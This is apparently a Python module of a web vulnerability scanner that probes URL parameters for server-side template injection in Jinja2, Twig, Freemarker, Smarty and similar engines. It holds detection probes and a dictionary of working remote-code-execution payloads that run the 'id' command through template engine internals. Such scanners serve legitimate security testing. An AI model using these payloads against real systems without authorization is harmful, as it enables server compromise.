"""
cyberm4fia-scanner - Server-Side Template Injection (SSTI) Scanner
Detects Jinja2, Twig, Mako, Smarty, Freemarker, Pebble template injection
"""

from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from utils.colors import log_info, log_success
from utils.request import smart_request
from utils.request import ScanExceptions

# ─────────────────────────────────────────────────────
# SSTI Payloads — each has a unique expected output
# ─────────────────────────────────────────────────────
SSTI_PAYLOADS = [
    # Jinja2 / Twig (Python / PHP)
    {"payload": "{{7*7}}", "expect": "49", "engine": "Jinja2/Twig"},
    {"payload": "{{7*'7'}}", "expect": "7777777", "engine": "Jinja2 (Python)"},
    {"payload": "${7*7}", "expect": "49", "engine": "Freemarker/Mako"},
    {"payload": "#{7*7}", "expect": "49", "engine": "Ruby ERB / Java EL"},
    {"payload": "<%= 7*7 %>", "expect": "49", "engine": "ERB / ASP"},
    {"payload": "{7*7}", "expect": "49", "engine": "Smarty"},
    {"payload": "{{config}}", "expect": "Config", "engine": "Jinja2 (Flask)"},
    # Math-based confirmation payloads
    {"payload": "{{4*4*4*4}}", "expect": "256", "engine": "Jinja2/Twig"},
    {"payload": "${4*4*4*4}", "expect": "256", "engine": "Freemarker/Mako"},
    {"payload": "#{4*4*4*4}", "expect": "256", "engine": "Java EL"},
]

# RCE escalation payloads (after detection, for evidence)
SSTI_RCE_PAYLOADS = {
    "Jinja2 (Python)": [
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
    ],
    "Jinja2/Twig": [
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    ],
    "Freemarker/Mako": [
        '${"freemarker.template.utility.Execute"?new()("id")}',
    ],
}

def inject_payload(url, param, payload, delay, method="get"):
    """Inject SSTI payload into a URL parameter."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    if param not in params:
        params[param] = [""]

    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    test_url = urlunparse(parsed._replace(query=new_query))

    try:
        if method == "get":
            resp = smart_request("get", test_url, delay=delay, timeout=8)
        else:
            data = {param: payload}
            resp = smart_request("post", url, data=data, delay=delay, timeout=8)

        return resp.text, resp.status_code
    except ScanExceptions:
        return None, None

def scan_ssti(url, delay=0):
    """Scan URL for SSTI vulnerabilities."""
    log_info(f"Starting SSTI scan on {url}")
    findings = []

    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    if not params:
        log_info("No parameters found for SSTI testing")
        return findings

    for param in params:
        log_info(f"Testing parameter: {param}")

        for entry in SSTI_PAYLOADS:
            payload = entry["payload"]
            expected = entry["expect"]
            engine = entry["engine"]

            body, status = inject_payload(url, param, payload, delay)
            if body is None:
                continue

            # Check if the mathematical result appears in response
            if expected in body:
                # Verify it's not already in the normal page
                clean_body, _ = inject_payload(
                    url, param, "harmless_test_string", delay
                )
                if clean_body and expected not in clean_body:
                    finding = {
                        "type": "SSTI",
                        "url": url,
                        "field": param,
                        "payload": payload,
                        "engine": engine,
                        "evidence": f"Response contains '{expected}'",
                        "severity": "CRITICAL",
                        "description": (
                            f"Server-Side Template Injection in '{param}' parameter. "
                            f"Engine: {engine}. This can lead to Remote Code Execution."
                        ),
                    }
                    findings.append(finding)
                    log_success(
                        f"[CRITICAL] SSTI found! Param: {param} | "
                        f"Engine: {engine} | Payload: {payload}"
                    )
                    break  # One confirmed finding per param is enough

    log_success(f"SSTI scan complete. Found {len(findings)} vulnerability(ies).")
    return findings
